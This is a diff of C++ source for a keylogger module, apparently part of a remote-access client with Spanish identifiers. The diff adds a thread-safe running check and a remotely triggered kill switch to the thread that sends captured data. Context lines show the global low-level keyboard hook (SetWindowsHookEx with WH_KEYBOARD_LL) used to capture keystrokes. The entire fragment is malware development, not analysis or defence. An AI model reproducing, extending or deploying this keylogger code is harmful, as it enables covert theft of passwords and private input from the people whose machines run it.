@@ -441,6 +441,11 @@ void mod_Keylogger::Stop() {
     cCliente->m_RemoteLog("[KEYLOGGER] Detenido");
 }
 
+bool mod_Keylogger::m_IsRunning() {
+    std::unique_lock<std::mutex> lock(this->mtx_Run);
+    return this->isRunning;
+}
+
 void mod_Keylogger::CaptureKeys() {
     kHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keyboard_Proc, GetModuleHandle(NULL), 0);
 
@@ -455,8 +460,19 @@ void mod_Keylogger::CaptureKeys() {
 void mod_Keylogger::SendThread() {
     while (1) {
         {
-            std::unique_lock<std::mutex> lock(this->mtx_Run);
+            /*std::unique_lock<std::mutex> lock(this->mtx_Run);
             if (!this->isRunning) {
+                break;
+            }*/
+            if (!this->m_IsRunning()) {
+                break;
+            }
+
+            //Kill switch
+            if (cCliente->isKillSwitch()) {
+                __DBG_("[KL] kill_switch...");
+                cCliente->setKillSwitch(false);
+                this->Stop();
                 break;
             }
         }
